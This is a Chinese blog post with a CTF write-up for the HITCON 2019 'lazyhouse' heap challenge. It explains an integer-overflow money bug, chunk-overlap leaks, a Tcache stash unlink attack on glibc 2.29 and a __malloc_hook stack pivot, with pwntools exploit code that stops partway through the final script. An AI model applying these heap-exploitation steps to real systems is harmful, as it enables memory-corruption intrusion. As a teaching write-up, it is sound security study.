<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>hitcon_ctf_2019_lazyhouse-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch，我的 WP，另一题就是就是本题，我并未在"><meta property="og:image" content><meta property="og:title" content="hitcon_ctf_2019_lazyhouse-WP"><meta property="og:description" content="hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch，我的 WP，另一题就是就是本题，我并未在"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1269.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-13T23:26:00+00:00"><meta property="article:modified_time" content="2021-04-13T23:26:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="hitcon_ctf_2019_lazyhouse-WP"><meta name=twitter:description content="hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch，我的 WP，另一题就是就是本题，我并未在"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.858703d01d3c45e6b3e5964f9788e10759b7deb2158ea92653787f83364a9899.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>hitcon_ctf_2019_lazyhouse-WP</h1><div class=meta>Posted on Apr 13, 2021</div></div><section class=body><p>hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 <a href=https://buuoj.cn/challenges#hitcon_ctf_2019_one_punch>one_punch</a>，<a href=https://www.cjovi.icu/WP/1226.html>我的 WP</a>，另一题就是就是本题，我并未在网络上找到环境，题目的二进制文件和 libc 可以在<a href=https://github.com/pr0cf5/CTF-writeups/tree/master/2019/hitcon/lazyhouse>这里</a>下载。Angel Boy 的题目自然质量有保证，我做了半天多才整出来。我使用的方法是所谓的 <code>Tcache stash unlink attack+</code>，在网络上并没有找到详细的同方法 WP，所以我这一篇就写的详细一些。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/3769147899.png></div><p>程序实现了 5 个功能，主要的漏洞点有两个</p><ol><li>在 Buy House 功能中有整数溢出的漏洞，可以刷出非常多的钱。</li><li>在 Upgrade 中提供了堆溢出的功能，可以溢出 0x20 字节，总共可以溢出两次。</li></ol><p>同时，在 Buy a super house 中，提供了一次使用 malloc 的机会，其余情况都只能使用 calloc。</p><h3 id=刷钱>刷钱</h3><p>首先分析如何刷钱，这是本题利用的第一步</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/1816775740.png></div><p>从 IDA 的反编译结果来看，不存在什么问题，但是从 <code>218 * size &lt;= money</code> 这一句的汇编实现上来看</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.text:0000000000001C84 loc_1C84:                               ; CODE XREF: buy_house+120↑j
</span></span><span style=display:flex><span>.text:0000000000001C84                 mov     rax, [rbp+size]
</span></span><span style=display:flex><span>.text:0000000000001C8B                 imul    rax, 0DAh
</span></span><span style=display:flex><span>.text:0000000000001C92                 mov     [rbp+var_120], rax
</span></span><span style=display:flex><span>.text:0000000000001C99                 lea     rax, money
</span></span><span style=display:flex><span>.text:0000000000001CA0                 mov     rax, [rax]
</span></span><span style=display:flex><span>.text:0000000000001CA3                 cmp     [rbp+var_120], rax
</span></span><span style=display:flex><span>.text:0000000000001CAA                 jbe     short loc_1CBD
</span></span></code></pre></div><p>执行 <code>imul rax, 0DAh</code> 时，结果会保存为 <code>rdx:rax</code> 的形式，如果结果非常大，溢出到了 rdx 上，但又使 rax 上的值小于 money 中的值，就不会报钱不够，如果我们买一个 size 符合这样大小的房子再卖掉，就可以获得很多很多钱。这样的 size 也很好凑，比如 <code>(2 ** 64) // 218 + 1</code> 就可以实现。</p><h3 id=leak-libc_base-和-heap_base>leak libc_base 和 heap_base</h3><p>由于 calloc 讨厌的清空分配空间的特性，传统的申请释放再申请的 leak 方法是无效的，据说 calloc 在对 mmap 的 chunk 是不会进行清空的，所以这也是一种 leak 的方法。不过我是使用 chunk overlapping 的方法实现的。利用 Upgrade 功能中的堆溢出，我们可以轻易地修改 chunk 的 size 字段，稍微布置一下就可以将该 chunk 的大小伪造的较大，使这个 chunk 包含多个其他 chunk，然后对这个 chunk 申请释放再申请，这个时候我们随时可以输出该 chunk 中的所有数据，然后我们 free 掉 chunk 中包含的多个 chunk，就可以把实现 leak。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
</span></span><span style=display:flex><span>    BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:0&#39;</span>)
</span></span><span style=display:flex><span>    Sell(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:0&#39;</span>) <span style=color:#60a0b0;font-style:italic># upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>1</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:1&#39;</span>) <span style=color:#60a0b0;font-style:italic># size changed</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>2</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:2&#39;</span>) <span style=color:#60a0b0;font-style:italic># leak heap_base</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>) <span style=color:#60a0b0;font-style:italic># leak libc_base</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>) <span style=color:#60a0b0;font-style:italic># fill size</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>5</span>,<span style=color:#40a070>0x100</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>*</span> <span style=color:#40a070>10</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>6</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:5=&gt;protect&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x110</span> <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>1</span>,<span style=color:#40a070>0x430</span>,(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x111</span>)) <span style=color:#666>*</span> <span style=color:#40a070>3</span>)
</span></span></code></pre></div><p>具体的布置方法如上，首先申请六个堆块，第零个堆块用来通过溢出修改 chunk 1 的 size 字段，用 chunk 5 帮助伪造，这样把 chunk 1 free 掉的时候就会把 chunk 2，3，4 一起扩进去。要注意的是将 chunk 1 申请回来的时候需要恢复堆布局，不然之后就无法 free 中间的堆块</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>Sell(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Show(<span style=color:#40a070>1</span>)
</span></span></code></pre></div><p>然后把 2，3 两个堆块 free 掉，就可以实现 leak 了。其中第二个堆块进入 Tcache 并填满之，fd 指向一个堆块，通过调试可以求出偏移，就可以算出堆基址。第三个堆块就会进入 unsorted bin，fd 指向 main_arena + 96，就可以算出 libc 基址。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sh.recv(0x110)
</span></span><span style=display:flex><span>heap_base = u64(sh.recv(8)) - 0x7B0
</span></span><span style=display:flex><span>log.success(&#34;heap_base:&#34; + hex(heap_base))
</span></span><span style=display:flex><span>sh.recv(0x110)
</span></span><span style=display:flex><span>libc_base = u64(sh.recv(8)) - libc.sym[&#34;__malloc_hook&#34;] - 0x10 - 96
</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(0)
</span></span><span style=display:flex><span>Sell(4)
</span></span><span style=display:flex><span>Sell(5)
</span></span><span style=display:flex><span>Sell(6)
</span></span></code></pre></div><p>由于堆块的申请有上限，需要将申请来的释放掉以便于下一步利用，这里的释放顺序需要注意，一些顺序是会导致分配器报错的。</p><h3 id=通过-tcache-stash-unlink-attack-实现任意地址分配>通过 Tcache stash unlink attack+ 实现任意地址分配</h3><p>leak 出了 libc 基质之后，由于可以对 tcache 的 next 指针任意写，所以直接 Tcache poisoning 是一个最自然的选择，但是本题只能用一次 malloc，而 Tcache poisoning 需要从 Tcahce 中取出两次 chunk 才可以实现分配，calloc 又不会从 Tcache 中取 chunk，所以需要用到能够不用 malloc 就实现将目标地址写到 tcache_entry 的方法。</p><p>libc 2.29 中新增 stash 机制</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (in_smallbin_range (nb))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      idx <span style=color:#666>=</span> smallbin_index (nb);
</span></span><span style=display:flex><span>      bin <span style=color:#666>=</span> bin_at (av, idx);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ((victim <span style=color:#666>=</span> last (bin)) <span style=color:#666>!=</span> bin)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          bck <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk;
</span></span><span style=display:flex><span>	  <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> victim))
</span></span><span style=display:flex><span>	    malloc_printerr (<span style=color:#4070a0>&#34;malloc(): smallbin double linked list corrupted&#34;</span>);
</span></span><span style=display:flex><span>          set_inuse_bit_at_offset (victim, nb);
</span></span><span style=display:flex><span>          bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
</span></span><span style=display:flex><span>          bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>if</span> (av <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena)
</span></span><span style=display:flex><span>	    set_non_main_arena (victim);
</span></span><span style=display:flex><span>          check_malloced_chunk (av, victim, nb);
</span></span><span style=display:flex><span><span style=color:#007020>#if USE_TCACHE
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	  <span style=color:#60a0b0;font-style:italic>/* While we&#39;re here, if we see other chunks of the same size,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	     stash them in the tcache.  */</span>
</span></span><span style=display:flex><span>	  size_t tc_idx <span style=color:#666>=</span> csize2tidx (nb);
</span></span><span style=display:flex><span>	  <span style=color:#007020;font-weight:700>if</span> (tcache <span style=color:#666>&amp;&amp;</span> tc_idx <span style=color:#666>&lt;</span> mp_.tcache_bins)
</span></span><span style=display:flex><span>	    {
</span></span><span style=display:flex><span>	      mchunkptr tc_victim;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	      <span style=color:#60a0b0;font-style:italic>/* While bin not empty and tcache not full, copy chunks over.  */</span>
</span></span><span style=display:flex><span>	      <span style=color:#007020;font-weight:700>while</span> (tcache<span style=color:#666>-&gt;</span>counts[tc_idx] <span style=color:#666>&lt;</span> mp_.tcache_count
</span></span><span style=display:flex><span>		     <span style=color:#666>&amp;&amp;</span> (tc_victim <span style=color:#666>=</span> last (bin)) <span style=color:#666>!=</span> bin)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		  <span style=color:#007020;font-weight:700>if</span> (tc_victim <span style=color:#666>!=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		    {
</span></span><span style=display:flex><span>		      bck <span style=color:#666>=</span> tc_victim<span style=color:#666>-&gt;</span>bk;
</span></span><span style=display:flex><span>		      set_inuse_bit_at_offset (tc_victim, nb);
</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (av <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena)
</span></span><span style=display:flex><span>			set_non_main_arena (tc_victim);
</span></span><span style=display:flex><span>		      bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
</span></span><span style=display:flex><span>		      bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		      tcache_put (tc_victim, tc_idx);
</span></span><span style=display:flex><span>	            }
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	    }
</span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020></span>          <span style=color:#902000>void</span> <span style=color:#666>*</span>p <span style=color:#666>=</span> chunk2mem (victim);
</span></span><span style=display:flex><span>          alloc_perturb (p, bytes);
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>return</span> p;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>所谓 stash 机制，其实就是尽量将各种传统 bin 中的 chunk 放到对应的 Tcahce 中。比如对于一个 small request，过去是找到 best fit 直接返回，但是现在在 best fit 之后，还会将 small bin 中所有的 chunk 取出，尝试放入 Tcahce。在 stash 时仅仅对队头的 chunk（也就是将返回给用户的 chunk）的链表完整性进行了检测，之后的 stash 过程中所有的解链，则和老版本 unsorted bin unlink 一样，会在没有检测的情况下直接执行</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
</span></span><span style=display:flex><span>bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
</span></span></code></pre></div><p>这里的 bck 是 tc_victim->bk，而 tc_victim 则是队尾的 chunk。</p><p>Tcache stash unlink attack+ 的利用方法就是先在 Tcahce 中布置 5 个 chunk，在 small bin 中布置 2 个 chunk 共计 7 个大小相同的 chunk，为了叙述方便，记 small bin 中的两个 chunk 为 chunk A 和 chunk B，其中 chunk B 为后进入 small bin 中的 chunk。</p><p>在不破坏 chunk B 的 fd 的情况下，改写 chunk B 的 bk 指针为我们想要分配到的地址减 0x10（记作 p - 0x10）。当我们进行一个 small request 的时候，chunk A 会被返回给用户，chunk B 会被 stash，bin->bk 会被写成 p - 0x10。</p><p>由于此时 Tcache 没满，还会继续进行 stash，而下一个 tc_victim 被赋值为 bin->bk，他指向的就是 p - 0x10，会被放到 Tcache 中，不过此时由于还会执行 bck->fd = bin，所以要保证 <code>*(p + 0x8)</code> 可写，只要这样就可以把目标地址放到 Tcache 中了。</p><p>这里为了实现 Tcache 中 5 个 chunk，small bin 中 2 个chunk，需要利用 unsorted bin 的前向合并，通过将两个 unsorted bin 合并成为和 Tcache 中 chunk 一样大小，然后进行一个较大的 request 把这两个 chunk 放到 small bin 中，就可以完成布置。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BuyHouse(<span style=color:#40a070>2</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:2&#39;</span>) <span style=color:#60a0b0;font-style:italic>#Upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:4&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>5</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:5&#39;</span>) <span style=color:#60a0b0;font-style:italic>#Upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>6</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:6&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>7</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:7&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;protect&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>7</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>6</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x400</span>,<span style=color:#4070a0>&#34;pass&#34;</span>) <span style=color:#60a0b0;font-style:italic># make the unsorted to small</span>
</span></span></code></pre></div><p>如上构造即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x400</span>,rop_chain) <span style=color:#60a0b0;font-style:italic># make the unsorted to small</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__malloc_hook_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
</span></span><span style=display:flex><span>fd_origin <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x1680</span>
</span></span><span style=display:flex><span>alloc_addr <span style=color:#666>=</span> __malloc_hook_addr <span style=color:#666>-</span> <span style=color:#40a070>0x200</span> <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade(<span style=color:#40a070>5</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x221</span>) <span style=color:#666>+</span> p64(fd_origin) <span style=color:#666>+</span> p64(alloc_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x210</span>,<span style=color:#4070a0>&#39;pass&#39;</span>)
</span></span></code></pre></div><p>然后通过 upgrade 修改 chunk B 的 fd 和 bk 后，再进行一次申请，触发 stash，就可以把目标地址放到 tcache 里面了。注意为了满足分配地址 + 8 处指向的地址可写，不能直接分配到 __malloc_hook 上，而是需要向前找。我选择了使用 <code>_IO_2_1_stdin_</code> 中的大量缓冲区指针来构造。</p><p>类似于 one_punch，此题也开启了白名单，需要使用 orw，one_punch 使用的是 add rsp 的 gadget，这种方法在本题失效。但是可以<del>容易地注意到</del>，calloc 地时候，使用了 rbp 传递需要分配的大小，所以我们把 __malloc_hook 修改为 leave ; ret，就可以栈迁移到堆上进行 rop 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#34;splitw&#34;</span>,<span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./lazyhouse&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/glibc/2.29/64/lib/libc.so.6&#34;)</span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>BuyHouse</span>(index,size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size:&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;House:&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Show</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>2</span>))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Sell</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>3</span>))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Upgrade</span>(index,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>4</span>))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;House:&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>BuySuperHouse</span>(payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>5</span>))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;House:&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>over_flow_size <span style=color:#666>=</span> (<span style=color:#40a070>2</span> <span style=color:#666>**</span> <span style=color:#40a070>64</span>) <span style=color:#666>//</span> <span style=color:#40a070>218</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>0</span>))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size:&#34;</span>,<span style=color:#007020>str</span>(over_flow_size))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span><span style=color:#4070a0>&#39;&#39;&#39; now we have lots of money &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
</span></span><span style=display:flex><span>    BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:0&#39;</span>)
</span></span><span style=display:flex><span>    Sell(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>5</span>):
</span></span><span style=display:flex><span>    BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x210</span>,<span style=color:#4070a0>&#39;index:0&#39;</span>)
</span></span><span style=display:flex><span>    Sell(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:0&#39;</span>) <span style=color:#60a0b0;font-style:italic># upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>1</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:1&#39;</span>) <span style=color:#60a0b0;font-style:italic># size changed</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>2</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:2&#39;</span>) <span style=color:#60a0b0;font-style:italic># leak heap_base</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>) <span style=color:#60a0b0;font-style:italic># leak libc_base</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>) <span style=color:#60a0b0;font-style:italic># fill size</span>
